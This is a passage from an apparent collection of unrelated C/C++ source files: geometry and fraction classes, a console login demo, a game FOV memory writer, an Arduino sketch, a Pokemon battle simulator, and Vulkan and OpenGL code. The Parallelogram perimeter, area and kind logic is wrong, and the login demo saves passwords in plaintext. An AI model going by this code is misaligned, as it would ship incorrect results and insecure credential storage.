server(\n    std::string(\"127.0.0.1\"), 33333,\n    std::make_unique<FollowerServerDelegate>());\n\n  auto result = server.Run();\n  std::cout << \"Run result: \" << static_cast<int>(result) << std::endl;\n  return 0;\n}\n",
    "\n\n#include <cassert>\n#include <cmath>\n\n#include \"Parallelogram.hpp\"\n\n\ndouble degreesToRadians(double degrees) {\n  return (degrees * M_PI) / 180.0;\n}\n\n\nParallelogram::Parallelogram(int side1, int side2, double interior): side1{side1},side2{side2},\n    interior{degreesToRadians(interior)} {\n  //  The Parallelogram can only be constructed if it is valid.\n  assert(interior <= 90.0 && \"Interior angle is greater than 90 degrees.\");\n  assert(0.0 < interior  && \"Interior angle is not positive.\");\n}\n\n\nint Parallelogram::getPerimeter() const {\n  return 2 * (side1 + side1);\n}\n\n\ndouble Parallelogram::getArea() const {\n  const double sine = sin(interior);\n  return side2 * side2 * sine;\n}\n\n\nbool Parallelogram::isRectangle() const {\n  return 2*interior == M_PI;\n}\n\n\nbool Parallelogram::isEquilateral() const {\n  return (side1 == side2);\n}\n\n\nbool Parallelogram::isSquare() const {\n  return isRectangle() && isEquilateral();\n}\n\n\nParallelogram::Kind Parallelogram::getKind() const {\n  if (isRectangle()) {\n    return Kind::RECTANGLE;\n  } else if (isEquilateral()) {\n    return Kind::EQUILATERAL;\n  } else if (isSquare()) {\n    return Kind::SQUARE;\n  } else {\n    return Kind::PARALLELOGRAM;\n  }\n}\n\n",
    "\ufeff#include <iostream> \n#include \"fracture.h\"\n\n\nusing namespace std;\n\nint main()\n{\n\tint input, numer, denum;\n\n\tcout << \"Make a fraction\\n\";\n\n\tcin >> numer >> denum;\n\n\tfracture fract{ numer,denum };\n\tfracture_operations fracture(fract);\n\n\tenum menu {SET = 1, GET, X, DIV, PLS, MNS, CONTRACTION};\n\n\tdo{\n\t\tcout << \"0 - exit\\n1 - Set\\n2 - Get\\n3 - Multiply\\n4 - Divide\\n5 - Plus\\n6 - Minus\\n7 - Contraction\\n\";\n\t\tcin >> input;\n\t\tswitch (input) {\n\t\tcase SET:\n\t\t\tcin >> numer >> denum;\n\n\t\t\tfract.numerator = numer;\n\t\t\tfract.denominator = denum;\n\n\t\t\tfracture.set(fract);\n\n\t\t\tbreak;\n\t\tcase GET:\n\t\t\tfract = fracture.get();\n\n\t\t\tcout << fract.numerator << \"/\" << fract.denominator;\n\n\t\t\tbreak;\n\t\tcase X:\n\t\t\tcin >> numer >> denum;\n\n\t\t\tfract.numerator = numer;\n\t\t\tfract.denominator = denum;\n\n\t\t\tfracture.multi(fract);\n\n\t\t\tbreak;\n\t\tcase DIV:\n\t\t\tcin >> numer >> denum;\n\n\t\t\tfract.numerator = numer;\n\t\t\tfract.denominator = denum;\n\n\t\t\tfracture.div(fract);\n\n\t\t\tbreak;\n\t\tcase PLS:\n\t\t\tcin >> numer >> denum;\n\n\t\t\tfract.numerator = numer;\n\t\t\tfract.denominator = denum;\n\n\t\t\tfracture.plus(fract);\n\n\t\t\tbreak;\n\t\tcase MNS:\n\t\t\tcin >> numer >> denum;\n\n\t\t\tfract.numerator = numer;\n\t\t\tfract.denominator = denum;\n\n\t\t\tfracture.min(fract);\n\n\t\t\tbreak;\n\t\tcase CONTRACTION:\n\t\t\tfracture.Contraction();\n\n\t\t\tbreak;\n\t\t}\n\t\tcout << '\\n';\n\n\t} while (input != 0);\n\n\treturn 0;\n}",
    "#include <iostream>\n#include <unistd.h>\t\t\t// Needed for sleep call.\nusing namespace std;\n\n//***********************************************************************\n// Program:\tcmdline02.cpp\n// Author:\tS. Turner\n// Date:\t09/18/2022\n// Compiler:\tg++ (gcc), version 11.3.1\n//\n// This program extends cmdline01.cpp by adding some error checking\n// for the command-line arguments. This can be useful when you want\n// to ensure they type a certain number of arguments.\n//***********************************************************************\n\nint main(int argc, char *argv[]) {\n\n  int i;\t\t\t// Loop iterator variable.\n\n//******************************************************************\n// This is the command-line error checking.\n// In this particular example, it forces you to type 3 arguments,\n// which includes the name of the program executable.\n//******************************************************************\n  if (argc != 3) {\n    cout << \"Usage:  \" << argv[0] << \" (param1) (param2)\" << endl;\n    exit(1);\n  }\n\n  cout << \"The number of arguments typed is \" << argc << endl;\n  cout << endl;\n\n  cout << \"The arguments typed were:  \" << endl;\n  for (i = 0; i < argc; i++)\n    cout << \"  argv[\" << i << \"]:  \" << argv[i] << endl;\n\n  return 0;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <windows.h>\r\n#include <sstream>\r\nusing namespace std;\r\n\r\nclass Login{\r\nprivate:\r\nstring LoginID, Password;\r\npublic:\r\nLogin():LoginID(\"\"),Password(\"\"){}\r\n\r\nvoid setID(string id){\r\nLoginID = id;\r\n}\r\n\r\nvoid setPW(string pw){\r\nPassword = pw;\r\n}\r\n\r\nstring getID(){\r\n return LoginID;\r\n}\r\n\r\nstring getPW(){\r\n return Password;\r\n}\r\n};\r\n\r\nint registration(Login log){\r\nsystem(\"cls\");\r\nstring id, pw;\r\ncout<<\"\\tEnter Login ID: \";\r\ncin>>id;\r\nlog.setID(id);\r\n\r\nstart:\r\ncout<<\"\\tEnter A Strong Password: \";\r\ncin>>pw;\r\nif(pw.length() >= 8){\r\nlog.setPW(pw);\r\n}\r\nelse{\r\ncout<<\"\\tEnter Minimum 8 Characters!\"<<endl;\r\ngoto start;\r\n}\r\nofstream outfile(\"D:/Login.txt\", ios::app);\r\nif(!outfile){\r\ncout<<\"\\tError: File Can't Open!\"<<endl;\r\n}\r\nelse{\r\noutfile<<\"\\t\"<<log.getID()<<\" : \"<<log.getPW()<<endl<<endl;\r\ncout<<\"\\tUser Registered Successfuly!\"<<endl;\r\n}\r\noutfile.close();\r\nSleep(3000);\r\n}\r\n\r\nlogin(){\r\nsystem(\"cls\");\r\nstring id, pw;\r\ncout<<\"\\tEnter Login ID: \";\r\ncin>>id;\r\n\r\ncout<<\"\\tEnter Password: \";\r\ncin>>pw;\r\n\r\nifstream infile(\"D:/Login.txt\");\r\nif(!infile){\r\ncout<<\"\\tError: File Can't Open!\"<<endl;\r\n}\r\nelse{\r\nstring line;\r\nbool found = false;\r\nwhile(getline(infile,line)){\r\nstringstream ss;\r\nss<<line;\r\nstring userID, userPW;\r\nchar delimiter;\r\nss>>userID>>delimiter>>userPW;\r\n\r\nif(id==userID && pw==userPW){\r\nfound = true;\r\n\r\ncout<<\"\\tPlease Wait\";\r\nfor(int i=0; i<3; i++){\r\ncout<<\".\";\r\nSleep(800);\r\n}\r\nsystem(\"cls\");\r\ncout<<\"\\tWelcome To This Page!\"<<endl;\r\n}\r\n}\r\nif(!found){\r\ncout<<\"\\tError: Incorrect Login ID Or Password!\"<<endl;\r\n}\r\n}\r\ninfile.close();\r\nSleep(5000);\r\n}\r\n\r\nint main(){\r\nLogin log;\r\n\r\nbool exit = false;\r\nwhile(!exit){\r\nsystem(\"cls\");\r\nint val;\r\ncout<<\"\\tWelcome To Registration & Login Form\"<<endl;\r\ncout<<\"\\t************************************\"<<endl;\r\ncout<<\"\\t1.Register.\"<<endl;\r\ncout<<\"\\t2.Login.\"<<endl;\r\ncout<<\"\\t3.Exit.\"<<endl;\r\ncout<<\"\\tEnter Choice: \";\r\ncin>>val;\r\n\r\nif(val==1){\r\nregistration(log);\t\r\n}\r\n\r\nelse if(val==2){\r\nlogin();\r\n}\r\n\r\nelse if(val==3){\r\nsystem(\"cls\");\r\nexit = true;\r\ncout<<\"\\tGood Luck!\"<<endl;\r\nSleep(3000);\r\n}\r\nSleep(3000);\r\n}\r\n}",
    "#include <imgui.h>\n\n// Got this function from an issue in the Dear ImGui Github\nvoid StyleButton(int mode) {\n  ImVec4 colors[] = {\n      ImColor(235, 111, 146), // Red\n      ImColor(235, 188, 186), // Pink\n      ImColor(196, 167, 231), // Purple\n      ImColor(156, 207, 216), // Turquoise\n  };\n\n\n  ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1);\n\n  ImGui::PushStyleColor(ImGuiCol_Text, colors[mode- 1]);\n  ImGui::PushStyleColor(ImGuiCol_Button, (ImVec4)ImColor(64, 61, 82));\n  ImGui::PushStyleColor(ImGuiCol_ButtonHovered, (ImVec4)ImColor(82, 79, 103));\n  ImGui::PushStyleColor(ImGuiCol_ButtonActive, (ImVec4)ImColor(33, 32, 46));\n  ImGui::PushStyleColor(ImGuiCol_Border, colors[mode - 1]);\n}\n\nvoid PopStyleColor(int style, int color) {\n  ImGui::PopStyleVar(style);\n  ImGui::PopStyleColor(color);\n}\n\nbool ButtonCenteredOnLine(const char *label, ImVec2 buttonSize,\n                          float alignment = 0.5f) {\n  ImGuiStyle &style = ImGui::GetStyle();\n\n  float size = ImGui::CalcTextSize(label).x + style.FramePadding.x * 2.0f;\n  float avail = ImGui::GetContentRegionAvail().x;\n\n  float off = (avail - buttonSize.x) * alignment;\n  if (off > 0.0f)\n    ImGui::SetCursorPosX(ImGui::GetCursorPosX() + off);\n\n  return ImGui::Button(label, buttonSize);\n}\n\nvoid TextCenteredOnLine(const char *label, float alignment = 0.5f) {\n  ImGuiStyle &style = ImGui::GetStyle();\n\n  float size = ImGui::CalcTextSize(label).x + style.FramePadding.x * 2.0f;\n  float avail = ImGui::GetContentRegionAvail().x;\n\n  float off = (avail - size) * alignment;\n  if (off > 0.0f)\n    ImGui::SetCursorPosX(ImGui::GetCursorPosX() + off);\n\n  ImGui::Text(\"%s\", label);\n}\n\nvoid ColorButton(float h, float s, float v);\n",
    "#include <iostream>\n#include <windows.h>\n#include <tlhelp32.h>\n#include <stdlib.h>\n#include \"CoDMemory.h\"\n#include \"procid.h\"\n\nint main(int argc, char** argv) {\n\n\tfloat desiredFOV;\n\t\n\tstd::cout << \"Enter the desired FOV: \";\n\tstd::cin >> desiredFOV;\n\t\n\tSleep(1000);\n\n\tstd::wstring mw2 = L\"iw4sp.exe\";\n\tDWORD pID = GetProcessIdByName(mw2);\n\tHWND hwnd = FindWindowA(NULL, \"Modern Warfare 2\");\n\tHANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);\n\n\tsystem(\"cls\");\n\tSleep(500);\n\n\tif (hwnd == NULL) \n\t{\n\t\tsystem(\"Color 0C\");\n\t\tstd::cout << \"Failed to find Call of Duty: Modern Warfare 2 (iw4sp.exe)\\n\\n\";\n\t\tSleep(1000);\n\t\tstd::cout << \"Please start Modern Warfare 2 (2009) from Steam & reopen utility.\\n\";\n\t\tSleep(1000);\n\t}\n\telse\n\t{\n\t\tsystem(\"Color 0A\");\n\t\tstd::cout << \"Found Call of Duty: Modern Warfare 2! Setting FOV to \" << desiredFOV << \"\\n\\n\";\n\n\t\tWriteProcessMemory(handle, LPVOID(0x01978B50), &desiredFOV, sizeof(desiredFOV), 0);\n\n\t\tSleep(1000);\n\t\tstd::cout << \"Successfully set FOV to \" << desiredFOV << \"!\\n\";\n\t\tSleep(1000);\n\t\tstd::cout << \"You may close the software!\\n\";\n\t\tSleep(100);\n\t}\n}",
    "//Definire pini \nconst int led1 = 10;\nconst int led2 = 9;\nconst int led3 = 8;\nconst int led4 = 7;\nconst int ledRGB_R = 6;\nconst int ledRGB_B = 5;\nconst int ledRGB_G = 4;\nconst int buttonStart = 3;\nconst int buttonStop = 2;\n\n//Variabile pt. stare\nunsigned long lastUpdate = 0;\nunsigned long buttonPressTime = 0;\nbool stopButtonPressed = false;\nbool stopButtonHeld = false;\nconst unsigned long interval = 3000;\nint batteryLevel = 0;\nbool charging = false;\nbool stationFree = true;\nbool finalBlinking = false;\nint blinkCount = 0;\n\nvoid setup()\n{\n  pinMode(led1, OUTPUT);\n  pinMode(led2, OUTPUT);\n  pinMode(led3, OUTPUT);\n  pinMode(led4, OUTPUT);\n  pinMode(ledRGB_R, OUTPUT);\n  pinMode(ledRGB_G, OUTPUT);\n  pinMode(buttonStart, INPUT_PULLUP);\n  pinMode(buttonStop, INPUT_PULLUP);\n\n  setStationFree();\n}\n\nvoid loop()\n{\n  //verific daca butonul de start a fost apasat si statia este libera\n  if (digitalRead(buttonStart) == LOW && stationFree) \n  {\n    delay(100);//debounce\n    startCharging();\n  }\n\n  //verific daca butonul de stop a fost apasat si incarcarea este activa\n  if (digitalRead(buttonStop) == LOW && !stopButtonPressed && charging)\n  {\n    //se inregistreaza timpul la care am apasat butonul\n    buttonPressTime = millis();\n    stopButtonPressed = true;\n    stopButtonHeld = false;\n  }\n\n  //gestionarea pt apasarea lunga pe butonul de stop\n  if (stopButtonPressed)\n  {\n    if (digitalRead(buttonStop) == HIGH)\n    {\n      //butonul a fost eliberat\n      unsigned long pressDuration = millis() - buttonPressTime;\n      stopButtonPressed = false;\n\n      //daca butonul a fost apasat timp de minim 1 sec -> oprim incarcarea si pornim clipirea led-urilor\n      if (pressDuration >= 1000 && charging){\n        stopChargingAndBlink(); // Oprire imediat\u0103 \u0219i clipire simultan\u0103 a LED-urilor\n      } else if (charging && !stopButtonHeld) {\n        //daca butonul s-a apasat scurt si incarcarea este activa -> oprim statia\n        stopCharging();\n      }\n    } \n    else if (millis() - buttonPressTime >= 1000 && !stopButtonHeld && charging)\n    {\n      stopButtonHeld = true;\n      stopChargingAndBlink();\n    }\n  }\n\n  //incarcarea progresiva\n  if (charging && !finalBlinking) \n  {\n    unsigned long currentMillis = millis();\n    if (currentMillis - lastUpdate >= interval)\n    {\n      updateBatteryLevel();\n      lastUpdate = currentMillis;\n    }\n  }\n\n  if (finalBlinking) {\n    blinkAllLedsFinal();\n  }\n}\n\n//fct start incarcare\nvoid startCharging() \n{\n  charging = true;\n  stationFree = false;\n  setRGBColor(255, 0, 0);//ocupat\n  batteryLevel = 0;\n  updateBatteryLevel();\n}\n\n//fct oprire incarcare si clipire\nvoid stopChargingAndBlink()\n{\n  charging = false;\n  finalBlinking = true;\n  blinkCount = 0;\n  lastUpdate = millis();\n}\n\n//fct oprire nefortata a incarcarii\nvoid stopCharging() \n{\n  charging = false;\n  setStationFree();\n}\n\n//fct incarcare baterie\nvoid updateBatteryLevel() \n{\n  digitalWrite(led1, LOW);\n  digitalWrite(led2, LOW);\n  digitalWrite(led3, LOW);\n  digitalWrite(led4, LOW);\n  \n//aprinderea progresiva a led-urilor\n  if (batteryLevel == 0){\n    blinkLED(led1);\n  } else if (batteryLevel == 1) {\n    digitalWrite(led1, HIGH);\n    blinkLED(led2);\n  } else if (batteryLevel == 2) {\n    digitalWrite(led1, HIGH);\n    digitalWrite(led2, HIGH); \n    blinkLED(led3);\n  } else if (batteryLevel == 3) {\n    digitalWrite(led1, HIGH);\n    digitalWrite(led2, HIGH);\n    digitalWrite(led3, HIGH);\n    blinkLED(led4);\n  }\n\n  batteryLevel++;\n\n  if (batteryLevel > 3){\n  delay(500);\n  digitalWrite(led1, LOW);\n  digitalWrite(led2, LOW);\n  digitalWrite(led3, LOW);\n    delay(500);\n    batteryLevel = 0;\n    startFinalBlinking();\n  }\n}\n\n//fct blink pt LED\nvoid blinkLED(int ledPin) \n{\n  digitalWrite(ledPin, HIGH);\n  delay(500);\n  digitalWrite(ledPin, LOW);\n  delay(500);\n  digitalWrite(ledPin, HIGH);\n  delay(500);\n  digitalWrite(ledPin, LOW);\n  delay(500);\n}\n\n//fct pt setarea led-ului RGB\nvoid setRGBColor(int red, int green, int blue) \n{\n  analogWrite(ledRGB_R, red);\n  analogWrite(ledRGB_G, green);\n  analogWrite(ledRGB_B, blue);\n}\n\n//fct pt resetarea statiei\nvoid setStationFree() \n{\n  stationFree = true;\n  charging = false;\n  finalBlinking = false;\n  setRGBColor(0, 255, 0);// verde\n  digitalWrite(led1, LOW);\n  digitalWrite(led2, LOW);\n  digitalWrite(led3, LOW);\n  digitalWrite(led4, LOW);\n}\n\n//fct pt inceperea secventei de clipire finala\nvoid startFinalBlinking() \n{\n  charging = false;\n  finalBlinking = true;\n  blinkCount = 0;\n  lastUpdate = millis();\n}\n\n//fct pentru clipirea finala a celor 4 led-uri\nvoid blinkAllLedsFinal()\n{\n  unsigned long currentMillis = millis();\n  if (currentMillis - lastUpdate >= 500) \n  {\n    lastUpdate = currentMillis;\n    \n    bool state = blinkCount % 2 == 0;\n    digitalWrite(led1, state);\n    digitalWrite(led2, state);\n    digitalWrite(led3, state);\n    digitalWrite(led4, state);\n    \n    blinkCount++;\n    if (blinkCount >= 6)\n    {\n      finalBlinking = false;\n      setStationFree();\n    }\n  }\n}\n",
    "#include <iostream>\n#include <map>\n#include <string>\n#include <cmath>\n#include \"battle.h\"\n#include \"battle_effects.h\"\n\nbool checkMoveEffect(Pokemon *p, int mc) {\n    if(p->bVal.substituteHp > 0) {\n        return false; // substitute blocks conditions\n    }\n    if(p->bVal.moveEffectsMask & mc) {\n        return false; // cannot apply an effect that's already active\n    }\n    // normally we would apply the condition here, but some moves have special protocol that isn't standardized, so just do it in the function\n    return true;\n}\nbool applyStatus(Pokemon *p, int sc, BattleContext *bc){\n    if(p->bVal.substituteHp > 0) {\n        return false; // substitute blocks conditions\n    }\n    if(p->bVal.condition == 0) {\n        p->bVal.condition |= sc;\n        return true;\n    }\n    return false;\n\n}\nbool applyVolatileStatus(Pokemon *p, int vc, BattleContext *bc) {\n    bool canBeAdded = true;\n    if(p->bVal.substituteHp > 0) {\n        canBeAdded = false; // substitute blocks most volatile conditions\n    }\n    if(vc && p->bVal.volConditions){\n        canBeAdded = false;\n    }\n    if(canBeAdded) {\n        p->bVal.volConditions |= vc;\n        return true;\n    }\n    return false;\n}\nint getStatStage(Pokemon *p, Stat stat) {\n    switch(stat) {\n        case Stat::ATTACK:\n            return p->bVal.atkStg;\n        case Stat::DEFENSE:\n            return p->bVal.defStg;\n        case Stat::SPECIAL_ATTACK:\n            return p->bVal.spAtkStg;\n        case Stat::SPECIAL_DEFENSE:\n            return p->bVal.spDefStg;\n        case Stat::SPEED:\n            return p->bVal.spdStg;\n        case Stat::ACCURACY:\n            return p->bVal.accStg;\n        case Stat::EVASION:\n            return p->bVal.evaStg;\n        default:\n            return 6;\n    }\n}\nbool modifyStat(bool affectSelf, Stat stat, int change, BattleContext *bc) {\n    Pokemon* p;\n    if(affectSelf) {\n        p = &bc->attacker.team[bc->attacker.battler];\n    } else {\n        if(bc->defender.sideConditions & SIDE_CONDITION_MIST) {\n            if(DEBUG) {\n                std::cout << \"\\tStat reduction prevented by Mist\" << std::endl;\n            }\n            return true; // prevented by mist // still successful, apparently, though I would think this is not true ?  TODO\n        }\n        p = &bc->defender.team[bc->defender.battler];\n        if(p->bVal.substituteHp > 0) {\n            return false; // prevented by substitute\n        }\n    }\n    int stageModifier = getStatStage(p, stat);\n    if(stageModifier == 12) {\n        return true; // TODO might need more testing, but I'm pretty sure this doesn't count as true failure for the purpose of advancing rng twice, so we return true still\n    } else if(stageModifier == 0) {\n        return true;\n    } else {\n        stageModifier = stageModifier + change;\n        if(stageModifier > 12) {\n            stageModifier = 12;\n        } else if(stageModifier < 0) {\n            stageModifier = 0;\n        }\n        switch(stat) {\n            case Stat::ATTACK:\n                p->bVal.atkStg = stageModifier;\n                break;\n            case Stat::DEFENSE:\n                p->bVal.defStg = stageModifier;\n                break;\n            case Stat::SPECIAL_ATTACK:\n                p->bVal.spAtkStg = stageModifier;\n                break;\n            case Stat::SPECIAL_DEFENSE:\n                p->bVal.spDefStg = stageModifier;\n                break;\n            case Stat::SPEED:\n                p->bVal.spdStg = stageModifier;\n                break;\n            case Stat::ACCURACY:\n                p->bVal.accStg = stageModifier;\n                break;\n            case Stat::EVASION:\n                p->bVal.evaStg = stageModifier;\n                break;\n            default:\n                return false;\n        }\n        return true;\n\n    }\n    return false;\n}\nbool applyBurn(Pokemon *p, BattleContext *bc) {\n    if(p->info.primaryType == Type::Fire || p->info.secondaryType == Type::Fire) {\n        return false;\n    }\n    bool appliedBurn = applyStatus(p, MON_CONDITION_BURN, bc);\n    if(p->bVal.item == ITEM_RAWST_BERRY && appliedBurn) {\n        if(DEBUG) {\n            std::cout << \"\\tRawst Berry Prevents Burn\" << std::endl;\n        }\n        p->bVal.item = 0; // consume rawst berry\n        p->bVal.condition = 0; // reset condition\n        return true; // the effect still technically succeeds\n    }\n    return appliedBurn;\n}\nbool applyPoison(Pokemon *p, BattleContext *bc) {\n    bool appliedPoison = applyStatus(p, MON_CONDITION_POISON, bc);\n    if(p->bVal.item == ITEM_PECHA_BERRY && appliedPoison) {\n        if(DEBUG) {\n            std::cout << \"\\tPecha Berry Prevents Poison\" << std::endl;\n        }\n        p->bVal.item = 0; // consume pecha berry\n        p->bVal.condition = 0; // reset condition\n        return true; // the poisoning effect still technically succeeds\n    }\n    return appliedPoison;\n}\nbool applyParalysis(Pokemon *p, BattleContext *bc) {\n    bool appliedParalysis = applyStatus(p, MON_CONDITION_PARALYSIS, bc);\n    if(p->bVal.item == IT",
    "#define GLFW_INCLUDE_VULKAN\n#include <GLFW/glfw3.h>\n\n#include <iostream>\n#include <stdexcept>\n#include <vector>\n#include <cstring>\n#include <cstdlib>\n#include <optional>\n#include <set>\n#include <cstdint>\n#include <limits>\n#include <algorithm>\n#include <fstream>\n\nconst uint32_t WIDTH = 800;\nconst uint32_t HEIGHT = 600;\n\nconst std::vector<const char*> validationLayers = {\n    \"VK_LAYER_KHRONOS_validation\"\n};\n\nconst std::vector<const char*> deviceExtensions = {\n    VK_KHR_SWAPCHAIN_EXTENSION_NAME\n};\n\n#ifdef NDEBUG\nconst bool enableValidationLayers = false;\n#else\nconst bool enableValidationLayers = true;\n#endif\n\nVkResult CreateDebugUtilsMessengerEXT(VkInstance instance, const VkDebugUtilsMessengerCreateInfoEXT* pCreateInfo, const VkAllocationCallbacks* pAllocator, VkDebugUtilsMessengerEXT* pDebugMessenger) {\n    auto func = (PFN_vkCreateDebugUtilsMessengerEXT) vkGetInstanceProcAddr(instance, \"vkCreateDebugUtilsMessengerEXT\");\n    if (func != nullptr) {\n        return func(instance, pCreateInfo, pAllocator, pDebugMessenger);\n    } else {\n        return VK_ERROR_EXTENSION_NOT_PRESENT;\n    }\n}\n\nvoid DestroyDebugUtilsMessengerEXT(VkInstance instance, VkDebugUtilsMessengerEXT debugMessenger, const VkAllocationCallbacks* pAllocator) {\n    auto func = (PFN_vkDestroyDebugUtilsMessengerEXT) vkGetInstanceProcAddr(instance, \"vkDestroyDebugUtilsMessengerEXT\");\n    if (func != nullptr) {\n        func(instance, debugMessenger, pAllocator);\n    }\n}\n\nstruct QueueFamilyIndices {\n    std::optional<uint32_t> graphicsFamily;\n    std::optional<uint32_t> presentFamily;\n\n    bool isComplete() {\n        return graphicsFamily.has_value() && presentFamily.has_value();\n    }\n};\n\nstruct SwapChainSupportDetails {\n    VkSurfaceCapabilitiesKHR capabilities;\n    std::vector<VkSurfaceFormatKHR> formats;\n    std::vector<VkPresentModeKHR> presentModes;\n};\n\nclass HelloTriangleApplication {\npublic:\n    void run() {\n        initWindow();\n        initVulkan();\n        mainLoop();\n        cleanup();\n    }\n\nprivate:\n    GLFWwindow* window;\n\n    VkInstance instance;\n    VkDebugUtilsMessengerEXT debugMessenger;\n\n    VkPhysicalDevice physicalDevice = VK_NULL_HANDLE;\n    VkDevice device;\n\n    VkQueue graphicsQueue;\n    VkQueue presentQueue;\n    VkSurfaceKHR surface;\n    \n    VkSwapchainKHR swapChain;\n    std::vector<VkImage> swapChainImages;\n    VkFormat swapChainImageFormat;\n    VkExtent2D swapChainExtent;\n    std::vector<VkImageView> swapChainImageViews;\n\n    VkRenderPass renderPass;\n    VkPipelineLayout pipelineLayout;\n\n    void initWindow() {\n        glfwInit();\n\n        glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);\n        glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n\n        window = glfwCreateWindow(WIDTH, HEIGHT, \"Vulkan\", nullptr, nullptr);\n    }\n\n    void initVulkan() {\n        createInstance();\n        setupDebugMessenger();\n        createSurface();\n        pickPhysicalDevice();\n        createLogicalDevice();\n        createSwapChain();\n        createImageViews();\n        createRenderPass();\n        createGraphicsPipeline();\n    }\n\n    void mainLoop() {\n        while (!glfwWindowShouldClose(window)) {\n            glfwPollEvents();\n        }\n    }\n\n    void cleanup() {\n        vkDestroyPipelineLayout(device, pipelineLayout, nullptr);\n        vkDestroyRenderPass(device, renderPass, nullptr);\n        for (auto imageView : swapChainImageViews) {\n            vkDestroyImageView(device, imageView, nullptr);\n        }\n        vkDestroySwapchainKHR(device, swapChain, nullptr);\n        vkDestroyDevice(device, nullptr);\n\n        if (enableValidationLayers) {\n            DestroyDebugUtilsMessengerEXT(instance, debugMessenger, nullptr);\n        }\n\n        vkDestroySurfaceKHR(instance, surface, nullptr);\n        vkDestroyInstance(instance, nullptr);\n        glfwDestroyWindow(window);\n\n        glfwTerminate();\n    }\n\n    void createInstance() {\n        if (enableValidationLayers && !checkValidationLayerSupport()) {\n            throw std::runtime_error(\"validation layers requested, but not available!\");\n        }\n\n        VkApplicationInfo appInfo{};\n        appInfo.sType = VK_STRUCTURE_TYPE_APPLICATION_INFO;\n        appInfo.pApplicationName = \"Hello Triangle\";\n        appInfo.applicationVersion = VK_MAKE_VERSION(1, 0, 0);\n        appInfo.pEngineName = \"No Engine\";\n        appInfo.engineVersion = VK_MAKE_VERSION(1, 0, 0);\n        appInfo.apiVersion = VK_API_VERSION_1_0;\n\n        VkInstanceCreateInfo createInfo{};\n        createInfo.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;\n        createInfo.pApplicationInfo = &appInfo;\n\n        auto extensions = getRequiredExtensions();\n        createInfo.enabledExtensionCount = static_cast<uint32_t>(extensions.size());\n        createInfo.ppEnabledExtensionNames = extensions.data();\n\n        VkDebugUtilsMessengerCreateInfoEXT debugCreateInfo{};\n        if (enableValidationLayers) {\n            createInfo.enabledLayerCount = static_cast<uint32_t>(validationLayers.size());\n            createInfo.ppEnabledLayerNames = valida",
    "\r\n#include <windows.h>\r\n#include<string.h>\r\n#include<stdarg.h>\r\n#include<stdio.h>\r\n#include<GL/glut.h>\r\n\r\nvoid *font;\r\nvoid *currentfont;\r\nstatic double x=0.0,x1=-3.5,x2=3.5,y1=-1.4,y2=-1.4,x3=-3.5,y3=1.3;\r\nstatic double move=-60;\r\nstatic bool goDown=false,goup=false,down=false,congested=false,remote=false;\r\n\r\nvoid setFont(void *font)\r\n{\r\n\tcurrentfont=font;\r\n}\r\n\r\nvoid drawstring(float x,float y,float z,char *string)\r\n{\r\n\tchar *c;\r\n\tglRasterPos3f(x,y,z);\r\n \r\n\tfor(c=string;*c!='\\0';c++)\r\n\t{\tglColor3f(0.0,1.0,1.0);\r\n\t\tglutBitmapCharacter(currentfont,*c);\r\n\t}\r\n}\r\n\r\nvoid \r\nstroke_output(GLfloat x, GLfloat y, char *format,...)\r\n{\r\n\tva_list args;\r\n\tchar buffer[200], *p;\r\n\tva_start(args, format);\r\n\tvsprintf(buffer, format, args);\r\n\tva_end(args);\r\n\tglPushMatrix();\r\n\tglTranslatef(x, y,2);\r\n\tglScaled(0.003, 0.005, 0.005);\r\n\tfor (p = buffer; *p; p++)\r\n    glutStrokeCharacter(GLUT_STROKE_ROMAN, *p);\r\n\tglPopMatrix();\r\n}\r\n\r\n\r\nvoid cloud(){\r\n\r\n\r\n\t//vertical eclipse\r\n\tglPushMatrix();\r\n\tglTranslatef(0.0,0.0,0.0);\r\n\tglScaled(1,3.5,0.1);\r\n\tglColor3f(1,1,1);\r\n\tglutSolidSphere(1,100,100);\r\n\tglPopMatrix();\r\n\t\r\n\t//horizotal eclipse\r\n\tglPushMatrix();\r\n\tglTranslatef(0.0,0.0,0.0);\r\n\tglScaled(3,2.65,0.1);\r\n\tglColor3f(1,1,1);\r\n\tglutSolidSphere(1,100,100);\r\n\tglPopMatrix();\r\n\r\n\tglPushMatrix();\r\n\tglScaled(3.5,1.8,0.1);\r\n\tglRotatef(60,0.0f,1.0f,1.0f);\r\n\tglTranslatef(0.0,0.0,0.0);\r\n\tglColor3f(1,1,1);\r\n\tglutSolidSphere(1,100,100);\r\n\tglPopMatrix();\r\n\r\n\tglPushMatrix();\t\r\n\tglScaled(1.5,3.5,0.1);\r\n\tglRotatef(50,0.0f,1.0f,1.0f);\r\n\tglTranslatef(0.0,0.0,0.0);\r\n\tglColor3f(1,1,1);\r\n\tglutSolidSphere(1,100,100);\r\n\tglPopMatrix();\r\n}\r\n\r\n\r\nvoid router(float x6, float y6,float z6)\r\n{\r\n\t\r\n    glColor3f(0.2,0.3,1);\r\n\tglPushMatrix();\r\n\tglScaled(0.2,1.0,0.1);\r\n    glRotatef(91,1.0f,0.0f,0.0f);\r\n\tglTranslatef(x6,y6,z6);\r\n\tglutSolidTorus(0.2,1.5,100,100);\r\n\tglPopMatrix();\r\n}\r\n\r\nvoid dte(float x1, float x2)\r\n{\r\n\tglPushMatrix();\r\n\tglTranslatef(x1,x2,0.1);\r\n\tglScaled(1,0.1,0.1);\r\n\tglColor3f(1,1,1);\r\n\tglRotatef(0,0.0f,1.0f,0.0f);\r\n\tglutWireCube(1.5);\r\n\tglPopMatrix();\r\n}\r\n\r\nvoid line()\r\n{\r\nglPushMatrix();\r\n    glBegin(GL_LINE_LOOP);\r\n\tglColor3f(1,0,0);\r\n\tglVertex3f(0.1,-0.2,1);\r\n\tglVertex3f(0.0,0,1);\r\n\tglVertex3f(2,1.3,1);\r\n\tglVertex3f(2.1,1.1,1);\r\n\tglEnd();\r\nglPopMatrix();\r\n}\r\n\r\nvoid line1()\r\n{\r\nglPushMatrix();\r\n    